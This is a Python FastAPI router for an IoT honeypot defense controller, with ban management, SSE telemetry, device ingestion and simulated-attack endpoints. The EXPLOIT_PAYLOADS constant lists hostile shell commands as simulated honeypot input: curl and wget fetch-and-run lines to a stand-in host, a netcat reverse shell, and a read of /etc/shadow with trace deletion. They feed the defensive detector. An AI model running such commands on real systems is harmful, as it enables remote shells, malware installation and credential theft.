import asyncio
import ipaddress
import json
import logging
import random
import time
from typing import Any, AsyncGenerator, Dict, List, Optional, Set, Tuple

from fastapi import APIRouter, Body, Header, HTTPException, Request, Response
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, Field

from controller.api.sse_broker import SSEBroadcaster
from controller.core.device_manager import RealDeviceManager
from controller.core.detector import IntrusionDetector
from controller.core.models import CowrieEvent
from controller.mitigation.quarantine import QuarantineManager

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api")

# Curated multi-IP pools using RFC 5737 TEST-NET documentation ranges
ATTACK_IP_POOLS: Dict[str, List[str]] = {
    "brute-force": [
        "198.51.100.99",
        "198.51.100.142",
        "198.51.100.205",
        "203.0.113.45",
        "192.0.2.81",
    ],
    "exploit": [
        "203.0.113.88",
        "203.0.113.154",
        "203.0.113.219",
        "198.51.100.175",
        "192.0.2.114",
    ],
    "port-sweep": [
        "198.51.100.77",
        "198.51.100.188",
        "192.0.2.63",
        "203.0.113.92",
        "192.0.2.199",
    ],
}

EXPLOIT_PAYLOADS: Tuple[str, ...] = (
    "curl -s http://malicious.payload/botnet.sh | sh",
    "wget http://malicious.payload/mirai.arm7 -O /tmp/m && chmod +x /tmp/m",
    "nc -e /bin/sh 192.0.2.55 4444",
    "cat /etc/shadow && rm -rf /tmp/traces",
    "wget http://198.51.100.10/loader.sh -O - | /bin/bash",
)


class UnbanRequest(BaseModel):
    ip: str = Field(..., description="Target IPv4 or IPv6 address to unban")
    admin_user: Optional[str] = Field("soc_admin", description="Identity executing the unban action")


class AttackSimulationRequest(BaseModel):
    src_ip: Optional[str] = Field(None, description="Optional explicit attacker IPv4 or IPv6 address")
    mode: str = Field("single", description="Simulation mode: 'single', 'random', or 'swarm'")


class TrafficModeRequest(BaseModel):
    mode: str = Field(..., description="Active telemetry mode: 'simulated' or 'live'")


class DeviceCreateRequest(BaseModel):
    device_id: str = Field(..., description="Unique alphanumeric device ID (e.g. cam_front_door)")
    name: str = Field(..., description="Friendly display name (e.g. Front Gate CCTV)")
    device_type: str = Field("cctv_camera", description="cctv_camera | iot_sensor | smart_actuator | edge_gateway")
    protocol: str = Field("rtsp_http", description="mqtt | rtsp_http | http_webhook")
    ip_address: str = Field(..., description="Device LAN/external IPv4 or IPv6 address")
    port: int = Field(554, description="Primary reachable TCP port (e.g. 554 RTSP, 80 HTTP, 1883 MQTT)")
    mqtt_topic: Optional[str] = Field("", description="Optional MQTT topic under home/#")
    snapshot_url: Optional[str] = Field("", description="Optional HTTP/HTTPS CCTV snapshot or MJPEG URL")


class DeviceBlockRequest(BaseModel):
    reason: Optional[str] = Field("Operator logical quarantine", description="Reason for blocking device ingestion")
    admin_user: Optional[str] = Field("soc_admin", description="Operator identity")


class DeviceIngestRequest(BaseModel):
    payload: Dict[str, Any] = Field(default_factory=dict, description="JSON telemetry/event payload from physical IoT device")


def _resolve_simulation_targets(
    attack_type: str,
    payload: Optional[AttackSimulationRequest],
) -> Tuple[List[str], str]:
    """Resolves attacker IP(s) from explicit input, random pool selection, or swarm mode."""
    pool = ATTACK_IP_POOLS[attack_type]
    if payload is None:
        return [pool[0]], "single"

    mode = (payload.mode or "single").strip().lower()
    if mode not in {"single", "random", "swarm"}:
        raise HTTPException(status_code=400, detail=f"Unsupported simulation mode: '{payload.mode}'")

    if mode == "swarm":
        return list(pool), "swarm"
    if mode == "random":
        return [random.choice(pool)], "random"

    if payload.src_ip:
        candidate = payload.src_ip.strip()
        try:
            normalized_ip = str(ipaddress.ip_address(candidate))
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=f"Invalid IP address '{candidate}': {exc}") from exc
        return [normalized_ip], "single"

    return [pool[0]], "single"


def make_response(
    status: str = "success",
    data: Optional[Dict[str, Any]] = None,
    message: str = "",
) -> Dict[str, Any]:
    """Helper ensuring consistent API response shapes across all endpoints."""
    return {
        "status": status,
        "timestamp": time.time(),
        "data": data or {},
        "message": message,
    }


def get_detector(request: Request) -> IntrusionDetector:
    return request.app.state.detector


def get_quarantine_manager(request: Request) -> QuarantineManager:
    return request.app.state.quarantine_manager


def get_broadcaster(request: Request) -> SSEBroadcaster:
    return request.app.state.sse_broadcaster


def get_device_manager(request: Request) -> RealDeviceManager:
    return request.app.state.device_manager


def _ensure_simulated_mode(request: Request) -> None:
    """Rejects synthetic simulation calls when controller is running in strict Live Traffic mode."""
    current_mode = getattr(request.app.state, "traffic_mode", "simulated")
    if current_mode != "simulated":
        raise HTTPException(
            status_code=409,
            detail="Simulation triggers are paused in Live Traffic mode. Switch to Simulated Traffic mode first.",
        )


@router.get("/health")
async def health_check() -> Dict[str, Any]:
    """Basic health check and service status."""
    return make_response(status="success", data={"service": "defense_controller", "status": "healthy"})


@router.get("/defense/status")
async def get_defense_status(request: Request) -> Dict[str, Any]:
    """Returns the current security inventory: active drops, banned count, and audit history."""
    detector = get_detector(request)
    quarantine = get_quarantine_manager(request)

    banned_ips = detector.firewall.list_banned_ips()
    recent_history = detector.db.get_history(limit=25)
    active_bans = detector.db.get_active_bans()

    # Dynamic inspection of IoT virtual node states
    node_states = {
        "iot_sensor_node": quarantine.get_container_network_status("iot_sensor_node"),
        "iot_bulb_node": quarantine.get_container_network_status("iot_bulb_node"),
        "iot_mqtt_broker": quarantine.get_container_network_status("iot_mqtt_broker"),
        "iot_cowrie_honeypot": quarantine.get_container_network_status("iot_cowrie_honeypot"),
    }

    device_manager = get_device_manager(request)
    traffic_mode = getattr(request.app.state, "traffic_mode", "simulated")

    return make_response(
        data={
            "traffic_mode": traffic_mode,
            "banned_ips": banned_ips,
            "banned_count": len(banned_ips),
            "active_bans": active_bans,
            "recent_mitigations": recent_history,
            "node_states": node_states,
            "registered_devices": device_manager.list_devices(),
        }
    )


# TODO(security): Require operator RBAC authentication on system mode & device registry mutations before exposing externally.
@router.get("/system/mode")
async def get_system_mode(request: Request) -> Dict[str, Any]:
    """Returns the active telemetry operating mode ('simulated' or 'live') and live endpoints."""
    current_mode = getattr(request.app.state, "traffic_mode", "simulated")
    return make_response(
        data={
            "mode": current_mode,
            "simulated_endpoints_enabled": current_mode == "simulated",
            "live_endpoints": {
                "mqtt_port": 1883,
                "honeypot_ssh_port": 2222,
                "webhook_template": "/api/devices/ingest/{device_id}",
            },
        }
    )


@router.post("/system/mode")
async def set_system_mode(payload: TrafficModeRequest, request: Request) -> Dict[str, Any]:
    """Switches strictly between Simulated Traffic and Live Traffic operational modes."""
    target_mode = (payload.mode or "").strip().lower()
    if target_mode not in {"simulated", "live"}:
        raise HTTPException(status_code=400, detail="Mode must be either 'simulated' or 'live'.")

    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    request.app.state.traffic_mode = target_mode
    detector.db.set_setting("traffic_mode", target_mode)
    await broadcaster.broadcast("mode_changed", {"mode": target_mode})

    return make_response(
        data={"mode": target_mode, "simulated_endpoints_enabled": target_mode == "simulated"},
        message=f"Switched operational mode to {target_mode.upper()} traffic.",
    )


@router.get("/stream")
async def sse_telemetry_stream(request: Request) -> StreamingResponse:
    """
    Unidirectional Server-Sent Events stream delivering real-time telemetry,
    honeypot attack records, and autonomous mitigation events to connected SOC dashboards.
    """
    broadcaster = get_broadcaster(request)
    client_queue = await broadcaster.subscribe()

    async def event_generator() -> AsyncGenerator[str, None]:
        try:
            # Send initial connection handshake
            yield f"event: connected\ndata: {{\"status\": \"connected\", \"timestamp\": {time.time()}}}\n\n"

            while True:
                # Check for client disconnect
                if await request.is_disconnected():
                    break

                try:
                    # Non-blocking wait for next event with 5-second heartbeat fallback
                    frame = await asyncio.wait_for(client_queue.get(), timeout=5.0)
                    yield frame
                except asyncio.TimeoutError:
                    # Send periodic keepalive heartbeat frame
                    yield f"event: heartbeat\ndata: {{\"type\": \"heartbeat\", \"timestamp\": {time.time()}}}\n\n"
        finally:
            await broadcaster.unsubscribe(client_queue)

    headers = {
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "X-Accel-Buffering": "no",
        "Content-Type": "text/event-stream",
    }
    return StreamingResponse(event_generator(), media_type="text/event-stream", headers=headers)


@router.post("/defense/unban")
async def manual_unban(payload: UnbanRequest, request: Request) -> Dict[str, Any]:
    """Manually revokes an iptables drop rule and updates the audit log."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.manual_unban(payload.ip, admin_user=payload.admin_user or "soc_admin")
    if not success:
        raise HTTPException(status_code=400, detail=f"Failed to remove drop rule for IP {payload.ip}")

    # Broadcast unban event over SSE
    await broadcaster.broadcast("unban_alert", {"ip": payload.ip, "unbanned_by": payload.admin_user})

    return make_response(
        message=f"Rule for IP {payload.ip} revoked successfully.",
        data={"unbanned_ip": payload.ip}
    )


@router.post("/defense/reset-bans")
async def reset_all_bans(request: Request) -> Dict[str, Any]:
    """Flushes the custom blocklist and clears active ban records."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.reset_all_bans()
    if not success:
        raise HTTPException(status_code=500, detail="Failed to flush firewall blocklist.")

    await broadcaster.broadcast("reset_alert", {"message": "All firewall blocklist rules flushed."})

    return make_response(message="All firewall drop rules have been successfully flushed.")


@router.post("/defense/reset-database")
async def reset_database_endpoint(request: Request) -> Dict[str, Any]:
    """Completely purges the audit database history, active bans, and in-memory analytics."""
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)

    success = detector.reset_full_database()
    if not success:
        raise HTTPException(status_code=500, detail="Failed to reset database.")

    await broadcaster.broadcast("database_reset_alert", {
        "message": "Database audit history and analytics completely wiped."
    })

    return make_response(message="Database and audit history successfully wiped clean.")


@router.post("/simulate/infect/{node_id}")
async def simulate_node_infection(node_id: str, request: Request) -> Dict[str, Any]:
    """Simulates internal compromise of a virtual IoT container, isolating it to quarantine."""
    _ensure_simulated_mode(request)
    quarantine = get_quarantine_manager(request)
    broadcaster = get_broadcaster(request)

    res = quarantine.quarantine_container(node_id)
    if res["status"] != "success":
        return make_response(status="error", data=res, message=res["message"])

    # Broadcast quarantine state transition
    await broadcaster.broadcast("node_quarantined", {
        "node_id": node_id,
        "state": "quarantined",
        "network": "iot_quarantine_net"
    })

    return make_response(data=res, message=f"Container {node_id} isolated into quarantine.")


@router.post("/simulate/restore/{node_id}")
async def restore_node_container(node_id: str, request: Request) -> Dict[str, Any]:
    """Restores an isolated IoT container back to the production network."""
    _ensure_simulated_mode(request)
    quarantine = get_quarantine_manager(request)
    broadcaster = get_broadcaster(request)

    res = quarantine.restore_container(node_id)
    if res["status"] != "success":
        return make_response(status="error", data=res, message=res["message"])

    await broadcaster.broadcast("node_restored", {
        "node_id": node_id,
        "state": "production",
        "network": "iot_production_net"
    })

    return make_response(data=res, message=f"Container {node_id} restored to production.")


@router.get("/simulate/attack/pools")
async def get_attack_ip_pools() -> Dict[str, Any]:
    """Returns curated attacker IP pools available for each simulation vector."""
    return make_response(data=ATTACK_IP_POOLS)


async def _emit_threshold_attack(
    detector: IntrusionDetector,
    broadcaster: SSEBroadcaster,
    target_ips: List[str],
    eventid: str,
    attempts_per_ip: int = 5,
) -> int:
    """Broadcasts and evaluates repeated threshold attack events across one or more attacker IPs."""
    events_triggered = 0
    delay = 0.02 if len(target_ips) > 1 else 0.05

    for attacker_ip in target_ips:
        for i in range(attempts_per_ip):
            if eventid == "cowrie.login.failed":
                event = CowrieEvent(
                    eventid=eventid,
                    src_ip=attacker_ip,
                    timestamp=time.time(),
                    username="root",
                    password=f"admin_pass_{i}",
                    message=f"login attempt [root/admin_pass_{i}] failed",
                    raw_data={"simulated": True},
                )
            else:
                event = CowrieEvent(
                    eventid=eventid,
                    src_ip=attacker_ip,
                    timestamp=time.time(),
                    message=f"Remote SSH version: SSH-2.0-Attacker_Probe_{i}",
                    raw_data={"simulated": True},
                )
            await broadcaster.broadcast("honeypot_hit", event.to_dict())
            detector.process_event(event)
            events_triggered += 1
            await asyncio.sleep(delay)

    return events_triggered


def _build_simulation_result(
    detector: IntrusionDetector,
    target_ips: List[str],
    mode: str,
    events_sent: int,
    pre_banned: Set[str],
    extra: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Builds standardized simulation telemetry metadata reporting newly banned vs already-banned IPs."""
    protected = [ip for ip in target_ips if detector.allowlist.is_ip_protected(ip)]
    already_banned = [ip for ip in target_ips if ip in pre_banned]
    newly_banned = [
        ip for ip in target_ips
        if ip not in pre_banned and ip not in protected and detector.firewall.is_ip_banned(ip)
    ]
    data: Dict[str, Any] = {
        "target_ip": target_ips[0],
        "target_ips": target_ips,
        "mode": mode,
        "events_sent": events_sent,
        "newly_banned": newly_banned,
        "already_banned": already_banned,
        "allowlist_protected": protected,
    }
    if extra:
        data.update(extra)
    return data


@router.post("/simulate/attack/brute-force")
async def trigger_simulated_bruteforce(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a credential brute-force simulation for a selected, random, custom, or swarm IP set."""
    _ensure_simulated_mode(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("brute-force", payload)
    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}

    events_triggered = await _emit_threshold_attack(
        detector=detector,
        broadcaster=broadcaster,
        target_ips=target_ips,
        eventid="cowrie.login.failed",
    )
    data = _build_simulation_result(detector, target_ips, mode, events_triggered, pre_banned)
    return make_response(
        data=data,
        message=f"Brute-force attack simulation ({mode}) completed for {', '.join(target_ips)}.",
    )


@router.post("/simulate/attack/exploit")
async def trigger_simulated_exploit(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a critical remote shell exploit simulation for a selected, random, custom, or swarm IP set."""
    _ensure_simulated_mode(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("exploit", payload)
    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}
    commands_used: List[str] = []

    for idx, attacker_ip in enumerate(target_ips):
        cmd = EXPLOIT_PAYLOADS[idx % len(EXPLOIT_PAYLOADS)]
        commands_used.append(cmd)
        event = CowrieEvent(
            eventid="cowrie.command.input",
            src_ip=attacker_ip,
            timestamp=time.time(),
            input_command=cmd,
            message=f"CMD: {cmd}",
            raw_data={"simulated": True},
        )
        await broadcaster.broadcast("honeypot_hit", event.to_dict())
        detector.process_event(event)
        if len(target_ips) > 1:
            await asyncio.sleep(0.03)

    data = _build_simulation_result(
        detector,
        target_ips,
        mode,
        len(target_ips),
        pre_banned,
        extra={"command": commands_used[0]},
    )
    return make_response(
        data=data,
        message=f"Terminal exploit simulation ({mode}) completed for {', '.join(target_ips)}.",
    )


@router.post("/simulate/attack/port-sweep")
async def trigger_simulated_port_sweep(
    request: Request,
    payload: Optional[AttackSimulationRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Triggers a rapid port reconnaissance sweep simulation for a selected, random, custom, or swarm IP set."""
    _ensure_simulated_mode(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    target_ips, mode = _resolve_simulation_targets("port-sweep", payload)
    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}

    events_triggered = await _emit_threshold_attack(
        detector=detector,
        broadcaster=broadcaster,
        target_ips=target_ips,
        eventid="cowrie.client.version",
    )
    data = _build_simulation_result(detector, target_ips, mode, events_triggered, pre_banned)
    return make_response(
        data=data,
        message=f"Reconnaissance sweep simulation ({mode}) completed for {', '.join(target_ips)}.",
    )


@router.get("/defense/analytics")
async def get_defense_analytics(request: Request) -> Dict[str, Any]:
    """Returns aggregated honeypot threat intelligence and attack analytics."""
    detector = get_detector(request)
    stats = detector.get_analytics()
    return make_response(data=stats)


@router.get("/defense/forensics/{ip}")
async def get_ip_forensics(ip: str, request: Request) -> Dict[str, Any]:
    """Returns deep chronological forensic timeline and event history for a specific IP."""
    detector = get_detector(request)
    forensics = detector.get_ip_forensics(ip)
    return make_response(data=forensics)


@router.get("/defense/export")
async def export_audit_report(request: Request) -> Dict[str, Any]:
    """Exports full audit and forensic records for external SIEM / compliance reporting."""
    detector = get_detector(request)
    analytics = detector.get_analytics()
    history = detector.db.get_history(limit=200)
    banned_ips = detector.firewall.list_banned_ips()

    export_payload = {
        "report_generated_at": time.time(),
        "total_active_drops": len(banned_ips),
        "banned_ips": banned_ips,
        "threat_intelligence": analytics,
        "mitigation_audit_log": history,
    }
    return make_response(data=export_payload, message="SOC Audit Report generated successfully.")


# --- Real-World IoT & CCTV Device Registry / Live Ingestion Routes ---

@router.get("/devices")
async def list_registered_devices(request: Request) -> Dict[str, Any]:
    """Lists all onboarded real-world IoT and CCTV devices (excluding secrets)."""
    device_manager = get_device_manager(request)
    return make_response(data={"devices": device_manager.list_devices()})


@router.post("/devices")
async def register_real_device(payload: DeviceCreateRequest, request: Request) -> Dict[str, Any]:
    """Registers a physical IoT device or CCTV camera with strict SSRF and IP validation."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)
    try:
        device = device_manager.register_device(
            device_id=payload.device_id,
            name=payload.name,
            device_type=payload.device_type,
            protocol=payload.protocol,
            ip_address=payload.ip_address,
            port=payload.port,
            mqtt_topic=payload.mqtt_topic,
            snapshot_url=payload.snapshot_url,
        )
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc

    public_device = {k: v for k, v in device.items() if k != "ingest_token"}
    await broadcaster.broadcast("device_registered", public_device)
    return make_response(
        data={"device": device},
        message=f"Device '{device['name']}' ({device['device_id']}) registered for Live Traffic monitoring.",
    )


@router.delete("/devices/{device_id}")
async def delete_registered_device(device_id: str, request: Request) -> Dict[str, Any]:
    """Removes a registered physical IoT device from monitoring."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)
    deleted = device_manager.delete_device(device_id)
    if not deleted:
        raise HTTPException(status_code=404, detail=f"Device '{device_id}' not found.")

    await broadcaster.broadcast("device_deleted", {"device_id": device_id})
    return make_response(data={"device_id": device_id}, message=f"Device '{device_id}' removed.")


@router.post("/devices/{device_id}/probe")
async def probe_real_device(device_id: str, request: Request) -> Dict[str, Any]:
    """Tests TCP reachability for a registered real-world IoT/CCTV device."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)
    updated = await device_manager.probe_device(device_id)
    if not updated:
        raise HTTPException(status_code=404, detail=f"Device '{device_id}' not found.")

    await broadcaster.broadcast("device_updated", updated)
    return make_response(
        data={"device": updated},
        message=f"Reachability probe for {updated['name']} ({updated['ip_address']}:{updated['port']}): {updated['status']}.",
    )


@router.get("/devices/{device_id}/snapshot")
async def proxy_camera_snapshot(device_id: str, request: Request) -> Response:
    """Proxies a validated HTTP/HTTPS camera snapshot frame with strict SSRF & size checks."""
    device_manager = get_device_manager(request)
    try:
        image_bytes, media_type = await asyncio.to_thread(device_manager.fetch_snapshot_sync, device_id)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except PermissionError as exc:
        raise HTTPException(status_code=403, detail=str(exc)) from exc
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    except RuntimeError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc

    return Response(
        content=image_bytes,
        media_type=media_type,
        headers={
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "X-Content-Type-Options": "nosniff",
        },
    )


@router.post("/devices/{device_id}/block")
async def block_real_device(
    device_id: str,
    request: Request,
    payload: Optional[DeviceBlockRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Logically quarantines a physical IoT device, blocking ingestion and logging audit mitigation."""
    device_manager = get_device_manager(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    reason = (payload.reason if payload and payload.reason else "Operator logical quarantine")
    try:
        result = device_manager.block_device(device_id, detector=detector, reason=reason)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc

    await broadcaster.broadcast("device_updated", result["device"])
    await broadcaster.broadcast("mitigation_alert", result["mitigation"])
    return make_response(
        data=result,
        message=f"Logical quarantine enforced on '{result['device']['name']}'. Ingestion blocked.",
    )


@router.post("/devices/{device_id}/unblock")
async def unblock_real_device(
    device_id: str,
    request: Request,
    payload: Optional[DeviceBlockRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Restores a logically quarantined physical IoT device and resumes telemetry ingestion."""
    device_manager = get_device_manager(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    admin_user = (payload.admin_user if payload and payload.admin_user else "soc_admin")
    try:
        result = device_manager.unblock_device(device_id, detector=detector, admin_user=admin_user)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc

    await broadcaster.broadcast("device_updated", result["device"])
    await broadcaster.broadcast("mitigation_alert", result["mitigation"])
    return make_response(
        data=result,
        message=f"Device '{result['device']['name']}' restored to live monitoring.",
    )


@router.post("/devices/ingest/{device_id}")
async def ingest_real_device_webhook(
    device_id: str,
    payload: DeviceIngestRequest,
    request: Request,
    x_device_token: Optional[str] = Header(default=None, alias="X-Device-Token"),
) -> Dict[str, Any]:
    """Authenticated HTTP webhook ingestion endpoint for external IoT hardware & NVR/camera alerts."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)

    existing = device_manager.get_device(device_id)
    if not existing:
        raise HTTPException(status_code=404, detail=f"Registered device '{device_id}' not found.")

    if not x_device_token or not device_manager.verify_ingest_token(device_id, x_device_token):
        raise HTTPException(status_code=401, detail="Invalid or missing X-Device-Token authentication header.")

    if existing.get("blocked"):
        await broadcaster.broadcast("device_telemetry_blocked", {
            "device_id": device_id,
            "name": existing["name"],
            "ip_address": existing["ip_address"],
            "topic": f"http/webhook/{device_id}",
            "channel": "HTTP_WEBHOOK",
        })
        raise HTTPException(
            status_code=403,
            detail=f"Device '{device_id}' is quarantined/blocked by SOC policy. Payload dropped.",
        )

    payload_str = json.dumps(payload.payload)
    updated = device_manager.record_device_telemetry(device_id, payload_str)
    if updated:
        await broadcaster.broadcast("device_updated", updated)
    await broadcaster.broadcast("iot_telemetry", {
        "topic": f"http/webhook/{device_id}",
        "payload": payload_str,
        "timestamp": time.time(),
        "device_id": device_id,
        "device_name": existing["name"],
        "mode": getattr(request.app.state, "traffic_mode", "simulated"),
    })
    return make_response(data={"device": updated}, message="Live device telemetry ingested.")

